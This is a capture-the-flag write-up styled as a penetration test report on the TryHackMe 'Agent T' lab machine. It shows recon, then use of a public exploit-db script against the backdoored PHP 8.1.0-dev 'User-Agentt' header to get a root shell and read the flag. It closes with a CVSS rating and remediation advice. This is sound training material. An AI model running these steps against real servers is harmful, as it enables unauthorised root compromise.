## Penetration Test Report
of "Agent T" machine (https://tryhackme.com/room/agentt)
09.23.2022


Duck9001
mail: 

### Table of contents:
Exective summary
Summary of results
Attack narrative
Conclusion
Risk rating
Recommendations

### Executive summary
With owner consent I conducted a penetration test of Agent T machine (https://tryhackme.com/room/agentt).

Efforts were placed on identification and exploitation of security weaknesses that could allow a remote attacker to gain unauthorised access to organizational data.

Specific goal was to access flag stored somewhere on machine

### Summary of results
Initial scan of Agent T ports revealed vulnerable http service that allowed Remote Code Execution (RCE).

### Attack narrative
#### Service identification
``ping -c 2 10.10.1.109`
```
PING 10.10.1.109 (10.10.1.109) 56(84) bytes of data.
64 bytes from 10.10.1.109: icmp_seq=1 ttl=63 time=125 ms
64 bytes from 10.10.1.109: icmp_seq=2 ttl=63 time=125 ms
```
ttl ~ 64 suggest it's a Linux machine.

`sudo nmap -Pn -sS 10.10.1.109`
```
PORT   STATE SERVICE
80/tcp open  http
```

`sudo nmap -sV -p80 10.10.1.109`
```
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```
Service: PHP 8.1.0-dev


#### RCE
`/usr/share/exploits/exploit-db/exploitdb/searchsploit PHP 8.1.0`
i.a.
```
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                   | php/webapps/49933.py
```

According to comments of above script early version of PHP 8.1.0-dev was released with a backdoor. This version allows for RCE using "User-Agentt" header.


Exploit provided by [Exploit_db](https://www.exploit-db.com/search) abuse that vulnerability creating a simple pseudo-shell with root privileges.
`sudo python3 /usr/share/exploits/exploit-db/exploitdb/exploits/php/webapps/49933.py`
```
Enter the full host url:
http://10.10.1.109:80

Interactive shell is opened on http://10.10.1.109:80
Can't acces tty; job crontol turned off.
$ whoami
root
```

RCE with root privileges result in a complete compromise of target.

#### Locating assets
Using pseudo-shell:
`find / -name "*flag*" 2> /dev/null`
i.a.
```
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/flag.txt
```

`cat /flag.txt` -> asset that was searched.


### Conclusion
Agnet T suffered vulnerability that would have dramatic effect if malicious party had expoited it.

The specific goals of penetration test was to gain read access to flag, which was met.

It is important to note, that that vulnerability is a threat not only to assets, but also **Identity Management**, **Authentication**, and **Access Control** especially, if webserver is a trusted node on infrastructure network.

### Risk rating
According to CVSS V3:

**`Critical`** (>9) - exploitation is straightforward, results in system-level compromise

### Recommendations
1. Frequent updates of installed software - when supply chain attack (or other vulnerabilities) are discovered maintainers patch them.
2. Port-knocking implementation - if webserver is meant for non-public purposes port-knocking would decrease likelihood of service detection.
3. Regular vulnerability assasments.


